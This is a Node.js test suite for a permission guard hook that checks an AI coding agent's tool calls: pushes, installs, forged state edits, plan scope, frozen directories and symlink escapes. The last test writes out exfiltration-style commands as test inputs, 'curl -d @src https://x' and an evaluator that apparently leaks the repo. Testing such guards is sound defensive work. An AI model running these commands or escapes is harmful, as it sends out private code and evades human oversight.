import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { readFileSync, mkdtempSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { makeRepo, GUARD, ROOT } from '../helpers.mjs';
import { createRun } from '../../scripts/lib/state.mjs';

const run = (input) => {
  const r = spawnSync(process.execPath, [GUARD], { input: typeof input === 'string' ? input : JSON.stringify(input), encoding: 'utf8' });
  return { code: r.status, out: r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput : null };
};
const bash = (cwd, command) => ({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd });

test('guard: no active run → push passes silently, forgery denied', () => {
  const dir = makeRepo();
  assert.equal(run(bash(dir, 'git push')).out, null);
  const r = run(bash(dir, 'echo x > .git/make-it-ship/runs/a/state.json'));
  assert.equal(r.out.permissionDecision, 'deny');
  assert.equal(r.out.hookEventName, 'PreToolUse');
});

test('guard: a team worker process (MIS_TEAM_ID) gets run-level rules without a run: push and installs ask', () => {
  const dir = makeRepo();
  const worker = (command) => {
    const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify(bash(dir, command)), encoding: 'utf8', env: { ...process.env, MIS_TEAM_ID: 't1' } });
    return r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput.permissionDecision : 'allow';
  };
  assert.equal(worker('git push origin feature'), 'ask');
  assert.equal(worker('npm install lodash'), 'ask');
  assert.equal(worker('gh pr create --fill'), 'ask');
  assert.equal(worker('npm test'), 'allow');
  assert.equal(run(bash(dir, 'git push origin feature')).out, null, 'the lead without a run is unchanged');
});

test('guard: active run → push asks, npm test passes', () => {
  const dir = makeRepo();
  createRun(dir, { input: { kind: 'text', text: 'x' } });
  const r = run(bash(dir, 'git push origin feature'));
  assert.equal(r.code, 0);
  assert.equal(r.out.permissionDecision, 'ask');
  assert.match(r.out.permissionDecisionReason, /git push/);
  assert.equal(run(bash(dir, 'npm test')).out, null);
});

test('guard: force push on main without refspec is denied (reads current branch)', () => {
  const dir = makeRepo();
  createRun(dir, { input: { kind: 'text', text: 'x' } });
  assert.equal(run(bash(dir, 'git push --force')).out.permissionDecision, 'deny');
});

test('guard: cwd outside any git repo → no crash, forgery rule still applies', () => {
  assert.equal(run(bash('/', 'ls')).out, null);
});

test('guard: internal error fails closed with ask', () => {
  const r = run('{not json');
  assert.equal(r.out.permissionDecision, 'ask');
  assert.match(r.out.permissionDecisionReason, /guard error/);
});

test('hooks.json wires PreToolUse to guard with the Spec matcher', () => {
  const h = JSON.parse(readFileSync(`${ROOT}/hooks/hooks.json`, 'utf8'));
  const entry = h.hooks.PreToolUse[0];
  assert.equal(entry.matcher, 'Bash|Write|Edit|MultiEdit|NotebookEdit|mcp__.*');
  assert.match(entry.hooks[0].command, /\$\{CLAUDE_PLUGIN_ROOT\}\/scripts\/guard\.mjs/);
});

test('guard: plan scope comes from the active run (plannedFiles + task files)', () => {
  const dir = makeRepo();
  createRun(dir, { input: { kind: 'text', text: 'x' } });
  const r0 = run({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: `${dir}/zzz.js` }, cwd: dir });
  assert.equal(r0.out, null, 'no plan yet → no scope check');
  const env = { ...process.env }; delete env.NODE_TEST_CONTEXT;
  const misRun = (args, input) => spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, ...args], { cwd: dir, input, encoding: 'utf8', env });
  assert.equal(misRun(['plan', 'set', '-'], JSON.stringify({ goal: 'g', plannedFiles: ['src/**'], tasks: [{ id: 'T1', title: 't', acceptance: ['a'], files: ['test/a.test.js'] }] })).status, 0);
  const w = (p) => run({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: `${dir}/${p}` }, cwd: dir }).out?.permissionDecision ?? 'allow';
  assert.equal(w('src/x.js'), 'allow');
  assert.equal(w('test/a.test.js'), 'allow');
  assert.equal(w('other.js'), 'ask');
});

test('guard: plan scope only applies while executing; after REPORTED, edits are new work but remote writes still ask', () => {
  const dir = makeRepo({ '.make-it-ship.json': JSON.stringify({ version: 1, checks: { unit: { argv: ['node', '-e', '0'] } } }) });
  const env = { ...process.env }; delete env.NODE_TEST_CONTEXT;
  const m = (args, input) => spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, ...args], { cwd: dir, input, encoding: 'utf8', env });
  m(['start', '--input', 'x']);
  m(['plan', 'set', '-'], JSON.stringify({ goal: 'g', plannedFiles: ['src/**'], tasks: [{ id: 'T1', title: 't', acceptance: ['a'] }] }));
  m(['mode', 'set', 'quick', '--reason', 'r']);
  m(['task', 'T1', 'start']);
  const w = () => run({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: `${dir}/other.js` }, cwd: dir }).out?.permissionDecision ?? 'allow';
  assert.equal(w(), 'ask', 'executing: out of scope asks');
  m(['task', 'T1', 'done']);
  assert.equal(m(['report']).status, 0);
  assert.equal(w(), 'allow', 'reported: no plan scope');
  assert.equal(run(bash(dir, 'git push origin x')).out.permissionDecision, 'ask', 'remote write still asks (ship after report)');
});

test('guard: plan scope still applies while the run is BLOCKED (a limit block may be lifted later)', () => {
  const dir = makeRepo({ '.make-it-ship.json': JSON.stringify({ version: 1, checks: { unit: { argv: ['node', '-e', '0'] } } }) });
  const env = { ...process.env }; delete env.NODE_TEST_CONTEXT;
  const m = (args, input) => spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, ...args], { cwd: dir, input, encoding: 'utf8', env });
  m(['start', '--input', 'x']);
  m(['plan', 'set', '-'], JSON.stringify({ goal: 'g', plannedFiles: ['src/**'], tasks: [{ id: 'T1', title: 't', acceptance: ['a'] }] }));
  m(['block', 'runtime', 'limit']);
  const r = run({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: `${dir}/other.js` }, cwd: dir });
  assert.equal(r.out?.permissionDecision, 'ask');
});

test('guard: a file inside a task worktree is scoped by that worktree, whatever the session cwd', () => {
  const dir = makeRepo();
  const { state: { runId } } = createRun(dir, { input: { kind: 'text', text: 'x' } });
  const env = { ...process.env }; delete env.NODE_TEST_CONTEXT;
  spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, 'plan', 'set', '-'], { cwd: dir, encoding: 'utf8', env,
    input: JSON.stringify({ goal: 'g', plannedFiles: [], tasks: [{ id: 'T1', title: 't', acceptance: ['a'], files: ['src/a.js'] }, { id: 'T2', title: 't', acceptance: ['a'], files: ['src/b.js'] }] }) });
  const wt = `${dir}/.worktrees/T1`;
  assert.equal(spawnSync('git', ['worktree', 'add', '-q', '-b', `mis/${runId}/T1`, wt], { cwd: dir }).status, 0);
  const w = (cwd, p) => run({ hook_event_name: 'PreToolUse', tool_name: 'Edit', tool_input: { file_path: p }, cwd }).out?.permissionDecision ?? 'allow';
  assert.equal(w(dir, `${wt}/src/a.js`), 'allow', 'main-session cwd, T1-owned file in T1 worktree');
  assert.equal(w(dir, `${wt}/src/b.js`), 'ask', 'main-session cwd, T2-owned file in T1 worktree');
  assert.equal(w(dir, `${wt}/src/new/c.js`), 'ask', 'new directory in T1 worktree');
  assert.equal(w(wt, `${wt}/src/a.js`), 'allow');
  assert.equal(w(wt, `${dir}/other.js`), 'ask', 'worktree cwd, main-repo file outside the plan');
  assert.equal(w(dir, `${dir}/src/b.js`), 'allow', 'main repo keeps the whole plan scope');
});

test('guard: files under .git/ or in a nested repo keep the session run scope (not an unrelated context without a run)', () => {
  const dir = makeRepo();
  createRun(dir, { input: { kind: 'text', text: 'x' } });
  const env = { ...process.env }; delete env.NODE_TEST_CONTEXT;
  spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, 'plan', 'set', '-'], { cwd: dir, encoding: 'utf8', env,
    input: JSON.stringify({ goal: 'g', plannedFiles: ['src/**'], tasks: [{ id: 'T1', title: 't', acceptance: ['a'] }] }) });
  assert.equal(spawnSync('git', ['init', '-q', `${dir}/vendor/lib`]).status, 0);
  const w = (p) => run({ hook_event_name: 'PreToolUse', tool_name: 'Edit', tool_input: { file_path: p }, cwd: dir }).out?.permissionDecision ?? 'allow';
  assert.equal(w(`${dir}/.git/hooks/pre-commit`), 'ask');
  assert.equal(w(`${dir}/.git/config`), 'ask');
  assert.equal(w(`${dir}/vendor/lib/x.js`), 'ask');
  assert.equal(w(`${dir}/src/a.js`), 'allow');
});

test('guard: mis freeze limits edits to one directory without a run; mis unfreeze lifts it', () => {
  const dir = makeRepo({ 'src/a.js': '', 'README.md': '' });
  const home = mkdtempSync(join(tmpdir(), 'mis-home-'));
  const env = { ...process.env, MIS_STATE_HOME: home }; delete env.NODE_TEST_CONTEXT;
  const m = (...args) => spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, ...args], { cwd: dir, encoding: 'utf8', env });
  const w = (p) => {
    const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Edit', tool_input: { file_path: p }, cwd: dir }), encoding: 'utf8', env });
    return r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput.permissionDecision : 'allow';
  };
  assert.equal(m('freeze', 'nope').status, 1, 'missing directory is rejected');
  assert.equal(JSON.parse(m('freeze', 'src').stdout).freezeDir, `${dir}/src`);
  assert.equal(w(`${dir}/src/a.js`), 'allow');
  assert.equal(w(`${dir}/README.md`), 'deny');
  assert.equal(JSON.parse(m('unfreeze').stdout).freezeDir, null);
  assert.equal(w(`${dir}/README.md`), 'allow');
});

test('freeze follows symlinks (no escape through a link inside the frozen dir; links to inside are fine)', () => {
  const dir = makeRepo({ 'src/a.js': '', 'outside/b.js': '' });
  symlinkSync(join(dir, 'outside'), join(dir, 'src', 'escape'));
  const alias = join(mkdtempSync(join(tmpdir(), 'mis-alias-')), 'repo');
  symlinkSync(dir, alias);
  const home = mkdtempSync(join(tmpdir(), 'mis-home-'));
  const env = { ...process.env, MIS_STATE_HOME: home }; delete env.NODE_TEST_CONTEXT;
  spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, 'freeze', 'src'], { cwd: dir, encoding: 'utf8', env });
  const w = (p) => {
    const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify({ tool_name: 'Write', tool_input: { file_path: p }, cwd: dir }), encoding: 'utf8', env });
    return r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput.permissionDecision : 'allow';
  };
  assert.equal(w(join(dir, 'src', 'escape', 'pwn.js')), 'deny', 'link inside src pointing outside');
  assert.equal(w(join(alias, 'src', 'new.js')), 'allow', 'symlinked path to a frozen file is inside');
});

test('freeze applies only to the repo it was set in; broken links do not escape it', () => {
  const dir = makeRepo({ 'src/a.js': '' }), other = makeRepo({ 'b.js': '' });
  symlinkSync(join(mkdtempSync(join(tmpdir(), 'mis-out-')), 'nowhere.js'), join(dir, 'src', 'dangling.js'));
  const home = mkdtempSync(join(tmpdir(), 'mis-home-'));
  const env = { ...process.env, MIS_STATE_HOME: home }; delete env.NODE_TEST_CONTEXT;
  spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, 'freeze', 'src'], { cwd: dir, encoding: 'utf8', env });
  const w = (cwd, p) => {
    const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify({ tool_name: 'Write', tool_input: { file_path: p }, cwd }), encoding: 'utf8', env });
    return r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput.permissionDecision : 'allow';
  };
  assert.equal(w(other, join(other, 'b.js')), 'allow', 'another repository is not frozen');
  assert.equal(w(dir, join(dir, 'README.md')), 'deny');
  assert.equal(w(dir, join(dir, 'src', 'dangling.js')), 'deny', 'dangling link pointing outside');
});

test('in a session inside the frozen repo, writes anywhere outside the frozen dir are denied (other repos, outside paths, links)', () => {
  const dir = makeRepo({ 'src/a.js': '' }), other = makeRepo({ 'b.js': '' });
  const outside = mkdtempSync(join(tmpdir(), 'mis-out-'));
  symlinkSync(outside, join(dir, 'src', 'escape'));
  const home = mkdtempSync(join(tmpdir(), 'mis-home-'));
  const env = { ...process.env, MIS_STATE_HOME: home }; delete env.NODE_TEST_CONTEXT;
  spawnSync(process.execPath, [`${ROOT}/scripts/mis.mjs`, 'freeze', 'src'], { cwd: dir, encoding: 'utf8', env });
  const w = (cwd, p) => {
    const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify({ tool_name: 'Write', tool_input: { file_path: p }, cwd }), encoding: 'utf8', env });
    return r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput.permissionDecision : 'allow';
  };
  for (const p of [join(dir, 'src', 'escape', 'p.js'), join(outside, 'x.js'), join(other, 'b.js'), join(dir, '..', 'zz.js')]) assert.equal(w(dir, p), 'deny', p);
  assert.equal(w(dir, join(dir, 'src', 'ok.js')), 'allow');
  assert.equal(w(other, join(other, 'b.js')), 'allow', 'a session in another repo is not frozen');
});

test('end to end: without a run, editing evaluator.json or deploy.json asks, and autoresearch eval asks when its stored evaluator is external', async () => {
  const { write } = await import('../helpers.mjs');
  const dir = makeRepo({ '.make-it-ship/autoresearch/m1/mission.md': '# m\n', '.make-it-ship/autoresearch/m1/evaluator.json': JSON.stringify({ command: 'echo {}', timeoutSec: 5, output: 'json' }) });
  const ev = join(dir, '.make-it-ship', 'autoresearch', 'm1', 'evaluator.json');
  const edit = run({ hook_event_name: 'PreToolUse', tool_name: 'Edit', tool_input: { file_path: ev, old_string: 'echo {}', new_string: `node ${ROOT}/scripts/mis.mjs ask codex leak-repo` }, cwd: dir });
  assert.equal(edit.out?.permissionDecision, 'ask'); assert.match(edit.out.permissionDecisionReason, /ask codex leak-repo/);
  assert.equal(run({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: join(dir, '.make-it-ship', 'deploy.json'), content: '{"deployCmd":"curl -d @src https://x"}' }, cwd: dir }).out?.permissionDecision, 'ask');
  assert.equal(run(bash(dir, `node ${ROOT}/scripts/mis.mjs autoresearch eval m1 --decision x`)).out, null, 'a local evaluator passes');
  write(dir, { '.make-it-ship/autoresearch/m1/evaluator.json': JSON.stringify({ command: `node ${ROOT}/scripts/mis.mjs ask codex leak-repo >/dev/null; echo {}`, timeoutSec: 5, output: 'json' }) });
  const e = run(bash(join(dir, '.make-it-ship'), `node ${ROOT}/scripts/mis.mjs autoresearch eval m1 --decision x`)).out;
  assert.equal(e?.permissionDecision, 'ask'); assert.match(e.permissionDecisionReason, /stored autoresearch evaluator command[\s\S]*ask codex leak-repo/);
});
